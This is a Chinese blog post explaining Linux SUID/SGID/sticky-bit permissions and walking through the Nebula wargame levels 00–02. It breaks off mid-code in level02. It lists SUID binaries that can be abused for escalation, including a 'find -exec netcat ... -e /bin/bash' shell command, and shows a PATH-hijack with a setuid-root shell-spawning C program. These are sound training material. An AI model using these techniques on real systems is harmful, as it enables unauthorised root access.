<!DOCTYPE html>



  


<html class="theme-next mist use-motion" lang="en">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />



  <meta name="google-site-verification" content="v_OkIhl-1XjKYm3MZSJoivLgfqE3N9Snb2bj2c9YDrw" />













  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />




  
  
  
  

  
    
    
  

  

  

  

  

  
    
    
    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
  






<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css" />


  <meta name="keywords" content="penetration testing, nebula" />








  <link rel="shortcut icon" type="image/x-icon" href="/images/favicon.ico?v=5.1.2" />






<meta name="description" content="linux suid提权做了nebula的练习之后，发现其基本都是利用suid程序漏洞进行提权，这里特此做个总结 linux特殊权限在linux权限当中，除了rwx三种基本权限之外，还有三种特殊权限，SUID、SGID、SBIT三种,例如以下: 123[nyrae@iZwz97s22su2pupywkv2a5Z /]$ ll -d /tmp; ll -l /usr/bin/passwd;drwxr">
<meta name="keywords" content="penetration testing, nebula">
<meta property="og:type" content="article">
<meta property="og:title" content="linux suid提权 &amp; 渗透测试练习nebula">
<meta property="og:url" content="http://yoursite.com/blog/exploit-exercises-nebula/index.html">
<meta property="og:site_name" content="empty_xl Blog">
<meta property="og:description" content="linux suid提权做了nebula的练习之后，发现其基本都是利用suid程序漏洞进行提权，这里特此做个总结 linux特殊权限在linux权限当中，除了rwx三种基本权限之外，还有三种特殊权限，SUID、SGID、SBIT三种,例如以下: 123[nyrae@iZwz97s22su2pupywkv2a5Z /]$ ll -d /tmp; ll -l /usr/bin/passwd;drwxr">
<meta property="og:locale" content="en">
<meta property="og:image" content="http://yoursite.com/blog/exploit-exercises-nebula/find.png">
<meta property="og:image" content="http://yoursite.com/blog/exploit-exercises-nebula/wireshark.png">
<meta property="og:updated_time" content="2018-08-30T09:38:58.000Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="linux suid提权 &amp; 渗透测试练习nebula">
<meta name="twitter:description" content="linux suid提权做了nebula的练习之后，发现其基本都是利用suid程序漏洞进行提权，这里特此做个总结 linux特殊权限在linux权限当中，除了rwx三种基本权限之外，还有三种特殊权限，SUID、SGID、SBIT三种,例如以下: 123[nyrae@iZwz97s22su2pupywkv2a5Z /]$ ll -d /tmp; ll -l /usr/bin/passwd;drwxr">
<meta name="twitter:image" content="http://yoursite.com/blog/exploit-exercises-nebula/find.png">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Mist',
    sidebar: {"position":"left","display":"post","offset":12,"offset_float":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: true,
    duoshuo: {
      userId: '0',
      author: 'Author'
    },
    algolia: {
      applicationID: 'QT63IJTEZX',
      apiKey: '39726b4e0e80a502f3d0a45f494af02f',
      indexName: 'blog.nyrae.icu',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/blog/exploit-exercises-nebula/"/>





  <title>linux suid提权 & 渗透测试练习nebula | empty_xl Blog</title>
  




<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
  ga('create', 'UA-90390918-1', 'auto');
  ga('send', 'pageview');
</script>


  <script type="text/javascript">
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "https://hm.baidu.com/hm.js?edc3c09a0382806fc3a47d6c11483da0";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script>










</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="en">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail ">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">empty_xl Blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">Hacked By_ emm myself?</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            Home
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            Categories
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
            
            About
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            Archives
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            Tags
          </a>
        </li>
      

      
        <li class="menu-item menu-item-search">
          
            <a href="javascript:;" class="popup-trigger">
          
            
              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
            
            Search
          </a>
        </li>
      
    </ul>
  

  
    <div class="site-search">
      
  <div class="popup search-popup local-search-popup">
  <div class="local-search-header clearfix">
    <span class="search-icon">
      <i class="fa fa-search"></i>
    </span>
    <span class="popup-btn-close">
      <i class="fa fa-times-circle"></i>
    </span>
    <div class="local-search-input-wrapper">
      <input autocomplete="off"
             placeholder="Searching..." spellcheck="false"
             type="text" id="local-search-input">
    </div>
  </div>
  <div id="local-search-result"></div>
</div>



    </div>
  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/blog/exploit-exercises-nebula/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="empty_xl">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.png">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="empty_xl Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">linux suid提权 & 渗透测试练习nebula</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-08-20T16:32:32+08:00">
                2018-08-20
              </time>
            

            
              <span class="post-meta-divider">|</span>
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-check-o"></i>
              </span>
              
                <span class="post-meta-item-text">Post modified</span>
              
              <time title="Post modified" itemprop="dateModified" datetime="2018-08-30T17:38:58+08:00">
                2018-08-30
              </time>
            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/penetration-testing/" itemprop="url" rel="index">
                    <span itemprop="name">penetration testing</span>
                  </a>
                </span>

                
                
                  , 
                
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/penetration-testing/linux/" itemprop="url" rel="index">
                    <span itemprop="name">linux</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <h1 id="linux-suid提权"><a href="#linux-suid提权" class="headerlink" title="linux suid提权"></a>linux suid提权</h1><p>做了<code>nebula</code>的练习之后，发现其基本都是利用<code>suid</code>程序漏洞进行提权，这里特此做个总结</p>
<h2 id="linux特殊权限"><a href="#linux特殊权限" class="headerlink" title="linux特殊权限"></a>linux特殊权限</h2><p>在linux权限当中，除了<code>rwx</code>三种基本权限之外，还有三种特殊权限，<code>SUID</code>、<code>SGID</code>、<code>SBIT</code>三种,例如以下:</p>
<figure class="highlight tap"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">[nyrae@iZwz97s22su2pupywkv2a5Z /]$ ll -d /tmp; ll -l /usr/bin/passwd;</div><div class="line">drwxrwxrwt.<span class="number"> 9 </span>root root<span class="number"> 4096 </span>8月 <span class="number"> 30 </span>03:13 /tmp</div><div class="line">-rwsr-xr-x.<span class="number"> 1 </span>root root<span class="number"> 27832 </span>6月 <span class="number"> 10 </span>2014 /usr/bin/passwd</div></pre></td></tr></table></figure>
<h3 id="SUID"><a href="#SUID" class="headerlink" title="SUID"></a>SUID</h3><p>即<code>SET UID</code>权限，其只出现于<strong>二进制文件拥有者执行权限x上，标注为s</strong>，其作用是<strong>如果执行者有其对应执行权限x，那么在程序运行过程中，程序将获得程序拥有者的权限</strong></p>
<p>举个例子:</p>
<figure class="highlight groovy"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">[nyrae<span class="meta">@iZwz</span>97s22su2pupywkv2a5Z ~]$ ll <span class="regexp">/usr/</span>bin/passwd</div><div class="line">-rwsr-xr-x. <span class="number">1</span> root root <span class="number">27832</span> <span class="number">6</span>月  <span class="number">10</span> <span class="number">2014</span> <span class="regexp">/usr/</span>bin/passwd</div><div class="line"></div><div class="line">[nyrae<span class="meta">@iZwz</span>97s22su2pupywkv2a5Z ~]$ ll <span class="regexp">/etc/</span>shadow</div><div class="line">---------- <span class="number">1</span> root root <span class="number">1038</span> <span class="number">6</span>月   <span class="number">9</span> <span class="number">17</span>:<span class="number">24</span> <span class="regexp">/etc/</span>shadow</div><div class="line"></div><div class="line">我们可以看到 passwd命令有s权限，且owner为root，其他用户有x执行权限，而<span class="regexp">/etc/</span>shadow默认全<span class="number">0</span>，所以当我们以用户(nyrae)权限去执行passwd设置密码时，其会暂时获取root权限，然后向<span class="regexp">/etc/</span>shadow中写入hash值</div></pre></td></tr></table></figure>
<p>注意的是，s权限只有二进制程序有效，shell脚本或目录是无效的，因为这个权限的存在，如果程序有漏洞可以被利用，我们就可以通过此方式获取更高的权限，例如如果owner 为root的二进制程序有set uid权限，且存在任意命令执行，那么我们就可以通过这个程序进行root提权，具体的在后面讨论</p>
<a id="more"></a>
<h3 id="SGID-amp-SBIT"><a href="#SGID-amp-SBIT" class="headerlink" title="SGID &amp; SBIT"></a>SGID &amp; SBIT</h3><h4 id="SGID"><a href="#SGID" class="headerlink" title="# SGID"></a># SGID</h4><p>同<code>SUID</code>,是在owner的x权限上有s标志，那么如果在群组x权限上的s标志，即为<code>SET GID</code>权限，即<code>SGID</code>,可以合理推测，是二进制程序在执行期间获取群组的权限支持。</p>
<figure class="highlight crystal"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">[root@study ~]<span class="comment"># ll /usr/bin/locate /var/lib/mlocate/mlocate.db</span></div><div class="line">-rwx--s--x. <span class="number">1</span> root slocate   <span class="number">40496</span> Jun <span class="number">10</span>  <span class="number">2014</span> /usr/bin/locate</div><div class="line">-rw-r-----. <span class="number">1</span> root slocate <span class="number">2349055</span> Jun <span class="number">15</span> <span class="number">03</span>:<span class="number">44</span> /var/<span class="class"><span class="keyword">lib</span>/<span class="title">mlocate</span>/<span class="title">mlocate</span>.<span class="title">db</span></span></div></pre></td></tr></table></figure>
<p>例如，上面的例子，<code>locate</code>程序具有<code>SGID</code>权限，其他用户(nyrae)有执行权限，当执行时，可以去读取mlocate.db的内容</p>
<p>当<code>SGID</code>用在目录上时，也是一种常见的操作，如果使用者对于此目录有进入权限(r、x)，使用者在此目录下的有效群组将变为目录的群组，即，若此用户可以在此目录下创建文件，则所创建的文件群组为目录群组用户。</p>
<h4 id="SBIT"><a href="#SBIT" class="headerlink" title="# SBIT"></a># SBIT</h4><p><code>Sticky Bit</code>只针对目录有效，其作用是在其目录中，使用者只能对自己创建的文件或目录进行删除/更名/移动等动作，而无法删除他人的文件，最为常见的就是<code>tmp</code>目录</p>
<figure class="highlight tap"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">[nyrae@iZwz97s22su2pupywkv2a5Z ~]$ ll -d /tmp</div><div class="line">drwxrwxrwt.<span class="number"> 9 </span>root root<span class="number"> 4096 </span>8月 <span class="number"> 30 </span>03:13 /tmp</div></pre></td></tr></table></figure>
<p>很容易理解，在<code>/tmp</code>中，每个用户只能操作自身创建的文件或目录</p>
<h2 id="利用SUID提权"><a href="#利用SUID提权" class="headerlink" title="利用SUID提权"></a>利用SUID提权</h2><p>因为<code>SUID</code>的独特性，我们之前也说了，如果<code>SUID</code>的程序owner为root且程序存在漏洞，我们就可以通过这个方式进行提权利用。</p>
<p>首先，查找可以owner为root且suid的二进制文件。</p>
<figure class="highlight groovy"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">[nyrae<span class="meta">@iZwz</span>97s22su2pupywkv2a5Z ~]$ find <span class="regexp">/ -user root -perm -4000 2&gt;/</span>dev/<span class="literal">null</span></div><div class="line"><span class="regexp">/usr/</span>lib64<span class="regexp">/dbus-1/</span>dbus-daemon-launch-helper</div><div class="line"><span class="regexp">/usr/</span>bin/chfn</div><div class="line"><span class="regexp">/usr/</span>bin/at</div><div class="line"><span class="regexp">/usr/</span>bin/passwd</div><div class="line"><span class="regexp">/usr/</span>bin/gpasswd</div><div class="line"><span class="regexp">/usr/</span>bin/sudo</div><div class="line"><span class="regexp">/usr/</span>bin/crontab</div><div class="line"><span class="regexp">/usr/</span>bin/su</div><div class="line"><span class="regexp">/usr/</span>bin/chage</div><div class="line"><span class="regexp">/usr/</span>bin/mount</div><div class="line"><span class="regexp">/usr/</span>bin/umount</div><div class="line"><span class="regexp">/usr/</span>bin/chsh</div><div class="line"><span class="regexp">/usr/</span>bin/pkexec</div><div class="line"><span class="regexp">/usr/</span>bin/newgrp</div><div class="line"><span class="regexp">/usr/</span>lib<span class="regexp">/polkit-1/</span>polkit-agent-helper<span class="number">-1</span></div><div class="line"><span class="regexp">/usr/</span>sbin/pam_timestamp_check</div><div class="line"><span class="regexp">/usr/</span>sbin/usernetctl</div><div class="line"><span class="regexp">/usr/</span>sbin/unix_chkpwd</div></pre></td></tr></table></figure>
<p>这是在我的阿里云主机上得到的结果，一些其他的系统或版本提供的suid程序不尽相同，可能要具体去看，对于网上的一些可用来提权的linux可执行文件，除了和版本有关，其主要依赖于管理员配置错误，将一些常见的程序加上了suid权限:</p>
<figure class="highlight sqf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">Nmap (低版本<span class="number">2.02</span>-<span class="number">5.21</span>可直接使用 --interactive进入交互模式 使用!sh进行提权)</div><div class="line"><span class="built_in">find</span> (如果<span class="built_in">find</span>以suid运行，可以使用 <span class="built_in">find</span> test -<span class="built_in">exec</span> whami \;方式运行，或 <span class="built_in">find</span> test -<span class="built_in">exec</span> netcat -v -l <span class="number">22222</span> -e /bin/bash \;反弹shell)</div><div class="line">vim (:shell)</div><div class="line">bash (bash -p)</div><div class="line">less</div><div class="line">more</div><div class="line">cp</div><div class="line">nano</div></pre></td></tr></table></figure>
<p>同时利用一些其他的suid程序，通过分析其漏洞，利用提权。具体的利用，根据环境不同而异。</p>
<h1 id="渗透测试练习-——-nebula"><a href="#渗透测试练习-——-nebula" class="headerlink" title="渗透测试练习 —— nebula"></a>渗透测试练习 —— nebula</h1><p><a href="https://exploit-exercises.com/nebula" target="_blank" rel="external">官方地址</a> 在这里，也可以使用ichunqiu的<a href="https://www.ichunqiu.com/battalion?t=2" target="_blank" rel="external">靶机</a> 总共分了20关，以<code>levelXX</code>的形式进行。</p>
<p>注: ichunqiu 上的问题描述有些问题 可以去官网看</p>
<p>这里所有的程序，基本都是利用suid程序漏洞进行提权，也算是作为linux suid提权的一个练习。</p>
<h2 id="level00"><a href="#level00" class="headerlink" title="level00"></a>level00</h2><blockquote>
<p>寻找将以<code>flag00</code>运行的suid程序</p>
</blockquote>
<p>推测为<code>find</code>查找特权文件:</p>
<figure class="highlight haml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">find</div><div class="line">[跟时间有关]</div><div class="line">find / -mtime 4</div><div class="line">find / -mtime +4</div><div class="line"></div><div class="line">[跟使用者和群组有关]</div><div class="line">   -<span class="ruby">uid n ：n 为数字，这个数字是使用者的帐号 ID，亦即 UID ，这个 UID 是记录在</span></div><div class="line"><span class="comment">            /etc/passwd 里面与帐号名称对应的数字。这方面我们会在第四篇介绍。</span></div><div class="line">   -<span class="ruby">gid n ：n 为数字，这个数字是群组名称的 ID，亦即 GID，这个 GID 记录在</span></div><div class="line"><span class="comment">            /etc/group，相关的介绍我们会第四篇说明～</span></div><div class="line">   -<span class="ruby">user name ：name 为使用者帐号名称喔！例如 dmtsai </span></div><div class="line">   -<span class="ruby">group name：name 为群组名称喔，例如 users ；</span></div><div class="line">   -<span class="ruby">nouser    ：寻找文件的拥有者不存在 /etc/passwd 的人！</span></div><div class="line">   -<span class="ruby">nogroup   ：寻找文件的拥有群组不存在于 /etc/group 的文件！</span></div><div class="line">                当你自行安装软件时，很可能该软件的属性当中并没有文件拥有者，</div><div class="line">                这是可能的！在这个时候，就可以使用 -nouser 与 -nogroup 搜寻。</div><div class="line"></div><div class="line">[跟文件权限有关]</div><div class="line">   -<span class="ruby">name filename：搜寻文件名称为 filename 的文件；</span></div><div class="line">   -<span class="ruby">size [+-]SIZE：搜寻比 SIZE 还要大（+）或小（-）的文件。这个 SIZE 的规格有：</span></div><div class="line">                   c: 代表 Byte， k: 代表 1024Bytes。所以，要找比 50KB</div><div class="line">                   还要大的文件，就是“ -size +50k ”</div><div class="line">   -<span class="ruby">type TYPE    ：搜寻文件的类型为 TYPE 的，类型主要有：一般正规文件 （f）, 设备文件 （b, c）,</span></div><div class="line">                   目录 （d）, 链接文件 （l）, socket （s）, 及 FIFO （p） 等属性。</div><div class="line">   -<span class="ruby">perm mode  ：搜寻文件权限“刚好等于” mode 的文件，这个 mode 为类似 chmod</span></div><div class="line">                 的属性值，举例来说， -rwsr-xr-x 的属性为 4755 ！</div><div class="line">   -<span class="ruby">perm -mode ：搜寻文件权限“必须要全部囊括 mode 的权限”的文件，举例来说，</span></div><div class="line">                 我们要搜寻 -rwxr--r-- ，亦即 0744 的文件，使用 -perm -0744，</div><div class="line">                 当一个文件的权限为 -rwsr-xr-x ，亦即 4755 时，也会被列出来，</div><div class="line">                 因为 -rwsr-xr-x 的属性已经囊括了 -rwxr--r-- 的属性了。</div><div class="line">   -<span class="ruby">perm /mode ：搜寻文件权限“包含任一 mode 的权限”的文件，举例来说，我们搜寻</span></div><div class="line">                 -<span class="ruby">rwxr-xr-x ，亦即 -perm /<span class="number">755</span> 时，但一个文件属性为 -rw-------</span></div><div class="line">                 也会被列出来，因为他有 -rw.... 的属性存在！</div><div class="line"></div><div class="line">[其他额外动作]</div><div class="line">-<span class="ruby">exec command ：command 为其他指令，-exec 后面可再接额外的指令来处理搜寻到的结果</span></div></pre></td></tr></table></figure>
<img src="/blog/exploit-exercises-nebula/find.png" alt="find cmd" title="find cmd">
<p>所以我们可以通过:</p>
<figure class="highlight gradle"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">find</span> <span class="regexp">/ -user flag00 -perm /</span><span class="number">4000</span> <span class="number">2</span>&gt;<span class="regexp">/dev/</span><span class="keyword">null</span></div><div class="line"></div><div class="line">其中<span class="number">2</span>为标准错误输出，<span class="number">1</span>为标准输出，<span class="number">0</span>为标准输入 <span class="regexp">/dev/</span><span class="keyword">null</span>为黑洞文件 只有输入</div></pre></td></tr></table></figure>
<p>或</p>
<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">fiind / -<span class="keyword">user</span> <span class="title">flag00</span> -perm /<span class="number">4000</span> -exec ls -l &#123;&#125; \; <span class="number">2</span>&gt;/dev/null</div></pre></td></tr></table></figure>
<p>得到<code>/bin/.../flag00</code>文件，运行，然后提示运行<code>getflag</code>程序，运行之后，提示已经在target 账户已生成flag，在<code>~</code>里面找了好久没找到，最后才发现<code>~</code>的绝对路径是<code>/home/level0</code></p>
<h2 id="level01"><a href="#level01" class="headerlink" title="level01"></a>level01</h2><blockquote>
<p>以level01登录账户，在/home/flag01里面找</p>
</blockquote>
<p>在相应路径中发现一个二进制文件，我们使用<code>ll /bin/getflag</code>发现，使用权限必须是root，而<code>flag01</code>的权限时<code>suid</code>，即执行时可获得其程序拥有者的权限，其中<code>flag01</code>源码如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span> </span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">gid_t</span> gid;</div><div class="line">  <span class="keyword">uid_t</span> uid;</div><div class="line">  gid = getegid();</div><div class="line">  uid = geteuid();</div><div class="line"></div><div class="line">  setresgid(gid, gid, gid);</div><div class="line">  setresuid(uid, uid, uid);</div><div class="line"></div><div class="line">  system(<span class="string">"/usr/bin/env echo and now what?"</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>我们发现其使用了<code>/usr/bin/env</code> 使用<code>env</code>来运行好处的原因是它会根据你的环境寻找并运行默认的版本，提供灵活性，所以这里的思路是，想办法去修改<code>$PATH</code>使用找到的<code>echo</code>是我们的<code>getflag</code>文件，这样在运行时，其有root权限，则可以getflag成功。于是，我们首先创建一个echo链接到getflag：</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ln -s <span class="regexp">/bin/g</span>etflag <span class="regexp">/tmp/</span>echo</div></pre></td></tr></table></figure>
<p>然后去修改<code>$PATH</code>内容:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$PATH</span> 环境变量修改</div><div class="line">[临时修改 <span class="built_in">export</span>]</div><div class="line"><span class="built_in">export</span> PATH = /usr/bin/sm:<span class="variable">$PATH</span></div><div class="line">立即生效, 临时改变，只能在当前的终端窗口中有效，当前窗口关闭后就会恢复原有的path配置</div><div class="line"></div><div class="line">[永久生效 修改用户]</div><div class="line">修改 ~/.bashrc 最后加上</div><div class="line"><span class="built_in">export</span> PATH=/usr/bin/sm:<span class="variable">$PATH</span></div><div class="line">使用<span class="built_in">source</span> 生效</div><div class="line">永久有效，仅对当前用户</div><div class="line"></div><div class="line">[永久生效 所有用户]</div><div class="line">修改/etc/profile</div><div class="line"><span class="built_in">export</span> PATH=/usr/bin/sm:<span class="variable">$PATH</span></div><div class="line">重启生效 ，永久有效，所有用户</div><div class="line"></div><div class="line">[永久生效 所有用户]</div><div class="line">修改 /etc/environment</div><div class="line"><span class="built_in">export</span> PATH=/usr/bin/sm:<span class="variable">$PATH</span></div><div class="line">重启生效 ，永久有效，所有用户</div></pre></td></tr></table></figure>
<p>于是我们修改path内容<code>export PATH=/tmp:$PATH</code>然后运行<code>./flag01</code>发现生成了<code>flag</code>内容，发现其权限为:</p>
<figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="literal">-</span><span class="comment">r</span><span class="literal">-</span><span class="literal">-</span><span class="comment">r</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span>  <span class="comment">1</span> <span class="comment">flag01</span> <span class="comment">flag01</span>    <span class="comment">15</span> <span class="comment">2016</span><span class="literal">-</span><span class="comment">08</span><span class="literal">-</span><span class="comment">17</span> <span class="comment">01:21</span> <span class="comment">flag</span></div></pre></td></tr></table></figure>
<p>只有<code>flag01</code>用户才可以读取，所以我们利用之前的思路，在tmp下生成一个test.c，然后运行<code>gcc -o echo test.c</code>,内容为下:</p>
<figure class="highlight autoit"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="built_in">int</span> main()</div><div class="line">&#123;</div><div class="line">      setuid(<span class="number">0</span>)<span class="comment">;</span></div><div class="line">      setgid(<span class="number">0</span>)<span class="comment">;</span></div><div class="line">      execl(<span class="string">"/bin/sh"</span>,<span class="string">"sh"</span>,(char *)<span class="number">0</span>)<span class="comment">;</span></div><div class="line">      <span class="keyword">return</span> <span class="number">0</span><span class="comment">;</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>其返回一个<code>shell</code>，使用<code>whoami</code>可以看到当前用户为<code>flag01</code>，则可以查看flag内容。</p>
<h2 id="level02"><a href="#level02" class="headerlink" title="level02"></a>level02</h2><blockquote>
<p>同样，以下代码存在任意代码执行，找到并获取flag</p>
</blockquote>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">int main(int argc, char **argv, char **envp)</div><div class="line">&#123;</div><div class="line">  char *<span class="keyword">buffer;</span></div><div class="line"></div><div class="line">  gid_t gid<span class="comment">;</span></div><div class="line">  uid_t uid<span class="comment">;</span></div><div class="line"></div><div class="line">  gid = getegid()<span class="comment">;</span></div><div class="line">  uid = geteuid()<span class="comment">;</span></div><div class="line"></div><div class="line">  setresgid(gid, gid, gid)<span class="comment">;</span></div><div class="line">  setresuid(uid, uid, uid)<span class="comment">;</span></div><div class="line"></div><div class="line">  <span class="keyword">buffer </span>= NULL<span class="comment">;</span></div><div 